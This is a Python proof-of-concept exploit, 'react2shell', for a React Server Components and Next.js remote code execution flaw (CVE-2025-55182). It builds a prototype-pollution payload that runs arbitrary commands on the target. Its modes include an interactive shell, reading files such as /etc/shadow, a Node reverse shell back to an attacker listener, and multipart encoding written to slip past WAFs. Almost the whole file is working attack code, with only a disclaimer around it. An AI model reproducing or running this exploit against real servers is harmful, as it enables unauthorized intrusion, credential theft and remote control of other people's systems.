#!/usr/bin/python3

# Title  : react2shell - CVE-2025-55182 (Next.js: CVE-2025-66478) PoC Exploit
# Author : Ravindu Wickramasinghe | rvz (@rvzsec)
# Link   : https://github.com/rvzsec/react2shell
# Website: www.zyenra.com

# DISCLAIMER:

# This proof-of-concept (POC) exploit is provided strictly for educational and research purposes.
# It is designed to demonstrate potential vulnerabilities and assist in testing the security posture of software systems.
# The author expressly disclaims any responsibility for the misuse of this code for malicious purposes or illegal activities.
# Any actions taken with this code are undertaken at the sole discretion and risk of the user.
# The author does not condone, encourage, or support any unauthorized access, intrusion, or disruption of computer systems.
# Use of this POC exploit in any unauthorized or unethical manner is strictly prohibited.
# By using this code, you agree to assume all responsibility and liability for your actions.
# Furthermore, the author shall not be held liable for any damages or legal repercussions resulting from the use or misuse of this code.
# It is your responsibility to ensure compliance with all applicable laws and regulations governing your use of this software.
# Proceed with caution and use this code responsibly.


import argparse
import base64
import json
import re
import socket
import sys
import time
import uuid
from dataclasses import dataclass
from typing import Optional
from urllib.parse import unquote, urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[err]: missing dep -> pip3 install requests")


class C:
    R = "\033[31m"; G = "\033[32m"; Y = "\033[33m"; B = "\033[34m"
    CY = "\033[36m"; BR = "\033[1m"; DIM = "\033[2m"; X = "\033[0m"


def banner():
    print(f"""{C.R}{C.BR}
    ┳┓┏┓┏┓┏┓┏┳┓┏┓┏┓┓┏┏┓┓ ┓
    ┣┫┣ ┣┫┃   ┃ ┏┛┗┓┣┫┣ ┃ ┃
    ┛┗┗┛┛┗┗┛  ┻ ┗┛┗┛┛┗┗┛┗┛┗┛{C.X}
    {C.DIM}CVE-2025-55182 · Flight Protocol RCE · CVSS 10.0
    Ravindu Wickramasinghe | rvz (@rvzsec)
    https://github.com/rvzsec/react2shell{C.X}
""")


def inf(m):  print(f"{C.B}[inf]:{C.X} {m}")
def err(m):  print(f"{C.R}[err]:{C.X} {m}")
def ins(m):  print(f"{C.Y}[ins]:{C.X} {m}")
def ok(m):   print(f"{C.G}[+]{C.X} {m}")


# trailing nonce that Function() eats as a harmless number literal
_B_NONCE = "1337"


def build_js_payload(js_code, redirect_path="/login"):
    # wrap attacker js so the result exfils via the x-action-redirect header
    # 1. run js_code, stringify result
    # 2. throw NEXT_REDIRECT with base64(result) in the digest field
    # 3. next.js converts to 303 with x-action-redirect: <path>?o=<b64>
    return (
        "var res;"
        "try{res=String(" + js_code + ")}catch(e){res=String(e&&e.stack||e)};"
        "var b64=Buffer.from(res).toString('base64');"
        "throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest:`NEXT_REDIRECT;push;" + redirect_path + "?o=${b64};303;`});"
    )


def js_for_cmd(cmd):
    return (
        "process.mainModule.require('child_process')"
        ".execSync(" + json.dumps(cmd) + ",{stdio:['ignore','pipe','pipe']})"
        ".toString()"
    )


def js_for_file_read(path):
    return (
        "process.mainModule.require('fs')"
        ".readFileSync(" + json.dumps(path) + ").toString('base64')"
    )


def js_for_revshell(lhost, lport):
    # pure-node revshell via net.Socket + child_process.spawn
    # works on minimal containers (only /bin/sh needed on target)
    return (
        "(function(){"
        "var net=process.mainModule.require('net'),"
        "cp=process.mainModule.require('child_process'),"
        "os=process.mainModule.require('os');"
        "var sh=os.platform()==='win32'?'cmd.exe':'/bin/sh';"
        "var s=new net.Socket();"
        "s.connect(" + str(lport) + "," + json.dumps(lhost) + ",function(){"
        "var p=cp.spawn(sh,[],{stdio:['pipe','pipe','pipe']});"
        "s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);"
        "});"
        "})(),'fired'"
    )


def build_payload(js_code, redirect_path="/login"):
    boundary = "----" + uuid.uuid4().hex

    # field 0 - fake Flight Chunk
    # then:    "$1:__proto__:then" -> Chunk.prototype.then (via field 1 back-ref)
    # status:  "resolved_model"    -> routes through initializeModelChunk
    # value:   nested $B trigger   -> Function ctor via _formData.get hijack
    # _formData.get: "$1:constructor:constructor" -> Object -> Function
    field0 = {
        "then":   "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value":  json.dumps({"then": "$B" + _B_NONCE}),
        "_response": {
            "_prefix":  build_js_payload(js_code, redirect_path),
            "_chunks":  "$Q2",
            "_formData": {"get": "$1:constructor:constructor"},
        },
    }

    return boundary, {
        "0": json.dumps(field0, separators=(",", ":")),
        "1": '"$@0"',     # back-ref to field 0 (closes self-thenable loop)
        "2": "[]",        # empty Map for _chunks
    }


def encode_multipart(boundary, fields):
    # hand-rolled - requests' encoder adds filename/content-type that some WAFs sniff
    parts = []
    for name, value in fields.items():
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
            f"{value}\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    return "".join(parts).encode("utf-8")


_REDIR_RE = re.compile(r"[?&]o=([A-Za-z0-9+/=_-]+)")


def extract_output(resp):
    for h in ("x-action-redirect", "X-Action-Redirect", "location", "Location"):
        v = resp.headers.get(h)
        if not v:
            continue
        m = _REDIR_RE.search(unquote(v))
        if not m:
            continue
        try:
            return base64.b64decode(m.group(1) + "==").decode("utf-8", "replace")
        except Exception:
            continue
    return None


@dataclass
class Target:
    url: str
    timeout: float = 15.0
    proxy: Optional[str] = None
    verify: bool = False
    extra_headers: Optional[dict] = None

    @property
    def session(self):
        s = requests.Session()
        if self.proxy:
            s.proxies = {"http": self.proxy, "https": self.proxy}
        s.verify = self.verify
        s.headers["User-Agent"] = (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        )
        if self.extra_headers:
            s.headers.update(self.extra_headers)
        return s


def send_exploit(target, js_code, redirect_path="/login", path="/"):
    boundary, fields = build_payload(js_code, redirect_path)
    body = encode_multipart(boundary, fields)

    url = target.url.rstrip("/") + path
    headers = {
        # Next-Action header routes the request into the Server Action pipeline.
        # value is irrelevant - validation runs AFTER the deserializer, where we land.
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Accept": "text/x-component, */*",
    }

    return target.session.post(
        url, data=body, headers=headers,
        timeout=target.timeout, allow_redirects=False,
    )


def _marker():
    return "r2s_" + uuid.uuid4().hex[:12]


def mode_check(target, path="/"):
    marker = _marker()
    inf(f"sending probe (marker={marker})")
    try:
        r = send_exploit(target, js_for_cmd(f"echo {marker}"), path=path)
    except requests.RequestException as e:
        err(f"network error: {e}")
        return False

    print(f"{C.DIM}    http {r.status_code} · {len(r.content)} bytes{C.X}")
    out = extract_output(r)

    if out and marker in out:
        ok(f"vulnerable - marker echoed back: {out.strip()!r}")
        return True

    if r.status_code == 500 and 'e{"digest' in r.text.lower():
        inf("possibly vulnerable - dev-mode 500 with digest leak, no output captured")
        return False
    if r.status_code in (303, 307) and any(k.lower() == "x-action-redirect" for k in r.headers):
        inf("redirect header present but marker missing - patched? or chunked output?")
        return False

    err("not vulnerable (or behind a waf / non-default route)")
    return False


def mode_exec(target, cmd, path="/"):
    try:
        r = send_exploit(target, js_for_cmd(cmd), path=path)
    except requests.RequestException as e:
        err(f"network error: {e}")
        return None
    return extract_output(r)


def mode_shell(target, path="/"):
    inf("interactive shell - 'exit' to quit, 'cd <dir>' is sticky, '!path <p>' to change exploit path")
    cwd = None
    while True:
        try:
            prompt = f"{C.G}r2s{C.X} {C.CY}{cwd or '?'}{C.X} > "
            cmd = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return
        if cmd.startswith("!path "):
            path = cmd.split(None, 1)[1].strip() or "/"
            inf(f"exploit path -> {path}")
            continue

        # sticky cd - prefix every command with the tracked cwd
        if cmd.startswith("cd "):
            new = cmd[3:].strip() or "~"
            full = f"cd {new} && pwd"
        else:
            full = f"cd {cwd or '.'} && {cmd}" if cwd else cmd

        out = mode_exec(target, full, path=path)
        if out is None:
            err("no output (command may have crashed or response stripped)")
            continue

        if cmd.startswith("cd "):
            cwd = out.strip().splitlines()[-1] if out.strip() else cwd
            continue

        sys.stdout.write(out)
        if not out.endswith("\n"):
            sys.stdout.write("\n")


def mode_file(target, remote_path, local_out, path="/"):
    inf(f"reading {remote_path}")
    try:
        r = send_exploit(target, js_for_file_read(remote_path), path=path)
    except requests.RequestException as e:
        err(f"network error: {e}")
        return
    out = extract_output(r)
    if not out:
        err("no output - file may not exist or exploit failed")
        return
    try:
        # inner js returns base64; out is the b64-decoded redirect (still b64 from fs)
        data = base64.b64decode(out.strip())
    except Exception:
        inf("output was not valid base64; writing raw")
        data = out.encode()

    if local_out:
        with open(local_out, "wb") as f:
            f.write(data)
        ok(f"wrote {len(data)} bytes -> {local_out}")
    else:
        sys.stdout.buffer.write(data)


def _detect_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("1.1.1.1", 53))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def mode_revshell(target, lhost, lport, path="/"):
    if not lhost:
        lhost = _detect_local_ip()
        inf(f"auto-detected lhost: {lhost}")
    ins(f"make sure your listener is running: nc -lvnp {lport}")
    inf(f"firing reverse shell -> {lhost}:{lport}")
    try:
        target.timeout = 5
        send_exploit(target, js_for_revshell(lhost, lport), path=path)
    except requests.RequestException:
        # expected - server is now talking to your listener, not us
        pass
    ok("payload sent. check your listener.")


def parse_args():
    p = argparse.ArgumentParser(
        prog="react2shell",
        description="CVE-2025-55182 - React Server Components Flight Protocol RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  ./react2shell.py check    -t http://target
  ./react2shell.py exec     -t http://target -c 'id'
  ./react2shell.py exec     -t http://target -c 'cat /etc/passwd' --path /api/foo
  ./react2shell.py file     -t http://target -f /etc/shadow -o shadow.txt
  ./react2shell.py shell    -t http://target
  ./react2shell.py revshell -t http://target --lhost 10.10.14.5 --lport 4444
""",
    )
    p.add_argument("mode", choices=["check", "exec", "shell", "file", "revshell"])
    p.add_argument("-t", "--target", required=True, help="target base URL (http[s]://host[:port])")
    p.add_argument("-c", "--cmd", help="command (exec mode)")
    p.add_argument("-f", "--file", help="remote file path (file mode)")
    p.add_argument("-o", "--out", help="local output file (file mode)")
    p.add_argument("--lhost", help="listener IP (revshell; auto if omitted)")
    p.add_argument("--lport", type=int, default=4444, help="listener port (revshell)")
    p.add_argument("--path", default="/", help="endpoint path on target (default: /)")
    p.add_argument("--redirect", default="/login",
                   help="redirect target embedded in the digest (default: /login)")
    p.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("-H", "--header", action="append", default=[],
                   help="extra header  -H 'Key: Value'  (repeatable)")
    p.add_argument("--no-banner", action="store_true")
    return p.parse_args()


def parse_url(raw):
    if not raw.startswith(("http://", "https://")):
        raw = "http://" + raw
    u = urlparse(raw)
    if not u.netloc:
        sys.exit(f"[err]: invalid target URL: {raw}")
    return f"{u.scheme}://{u.netloc}"


def parse_headers(items):
    out = {}
    for h in items:
        if ":" not in h:
            err(f"ignoring malformed header (no colon): {h!r}")
            continue
        k, v = h.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def main():
    args = parse_args()

    if not args.no_banner:
        banner()

    target = Target(
        url=parse_url(args.target),
        timeout=args.timeout,
        proxy=args.proxy,
        extra_headers=parse_headers(args.header),
    )
    inf(f"target: {target.url}{args.path}")

    t0 = time.time()
    try:
        if args.mode == "check":
            ok_ = mode_check(target, path=args.path)
            print(f"{C.DIM}    done in {time.time()-t0:.2f}s{C.X}")
            return 0 if ok_ else 2

        if args.mode == "exec":
            if not args.cmd:
                sys.exit("[err]: exec mode requires -c")
            out = mode_exec(target, args.cmd, path=args.path)
            if out is None:
                err("exploit failed - no output captured")
                return 1
            sys.stdout.write(out)
            if not out.endswith("\n"):
                sys.stdout.write("\n")
            return 0

        if args.mode == "shell":
            mode_shell(target, path=args.path)
            return 0

        if args.mode == "file":
            if not args.file:
                sys.exit("[err]: file mode requires -f")
            mode_file(target, args.file, args.out, path=args.path)
            return 0

        if args.mode == "revshell":
            mode_revshell(target, args.lhost, args.lport, path=args.path)
            return 0

    except KeyboardInterrupt:
        print()
        inf("interrupted")
        return 130

    return 0


if __name__ == "__main__":
    sys.exit(main())
